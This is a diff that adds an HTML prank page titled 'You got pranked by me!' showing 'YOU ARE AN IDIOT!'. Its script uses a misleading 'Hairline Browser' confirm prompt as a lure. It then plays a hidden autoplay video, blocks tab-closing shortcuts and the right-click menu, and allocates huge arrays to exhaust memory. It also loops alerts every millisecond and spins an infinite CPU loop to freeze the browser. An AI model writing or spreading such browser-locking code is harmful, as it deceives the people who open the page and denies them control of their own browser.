@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+  <Title>You got pranked by me! It's okay, your tab will go back to normal soon</Title>
+<style>
+body {
+  background-image: url('https://image.winudf.com/v2/image/Y29tLmhlam5hLnlvdWFyZV9zY3JlZW5zaG90c18wXzYwYjNlNzdk/screen-0.jpg?fakeurl=1&type=.jpg');
+}
+</style>
+  
+  <style>
+h1 {text-align: center;}
+</style>
+  <style>
+body {
+  color: blue;
+}
+
+h1 {
+  color: white;
+}
+</style>
+<h1>YOU ARE AN IDIOT!</h1>
+  
+<!-- Hidden YouTube iframe -->
+<iframe id="ytplayer" width="0" height="0" src="" allow="autoplay" style="display:none;"></iframe>
+
+<script>
+// Prevent closing or navigating away from the page
+window.onbeforeunload = function() {
+  return "Are you sure you want to leave?";
+};
+
+if (confirm("Do you want to run Hairline Browser right now?")) {
+  // Play the YouTube video
+  document.getElementById("ytplayer").src = "https://www.youtube.com/embed/48rz8udZBmQ?autoplay=1";
+
+  // Block keyboard shortcuts for closing the tab
+  document.addEventListener('keydown', function(event) {
+    if (event.key === 'F4' || event.ctrlKey && (event.key === 'w' || event.key === 'W' || event.key === 't' || event.key === 'T')) {
+      event.preventDefault();
+    }
+  });
+
+  // Block right-click menu
+  document.addEventListener('contextmenu', function(event) {
+    event.preventDefault();
+  });
+
+  // Block any attempt to close the tab with mouse
+  window.addEventListener('beforeunload', function(event) {
+    event.preventDefault();
+    event.returnValue = ''; // Display a confirmation prompt
+  });
+
+  // Memory hogging to freeze the browser
+  let memoryHog = [];
+  for (let i = 0; i < 1e7; i++) {
+    memoryHog.push(new Array(1e3).fill(Math.random())); // Create large nested arrays
+  }
+
+  // Create more objects in memory
+  let objectHog = {};
+  for (let i = 0; i < 1e6; i++) {
+    objectHog[i] = { prop: Math.random() }; // Fill memory with random objects
+  }
+
+  // Infinite alerts to keep user distracted
+  setTimeout(function infiniteAlerts() {
+    alert("YOU ARE AN IDIOT!");
+    setTimeout(infiniteAlerts, 1);
+  }, 1);
+
+  // Heavy computation to freeze the tab further
+  while (true) {
+    for (let i = 0; i < 1e7; i++) {
+      Math.sqrt(Math.random());
+    }
+  }
+}
+</script>
+
+</body>
+</html>
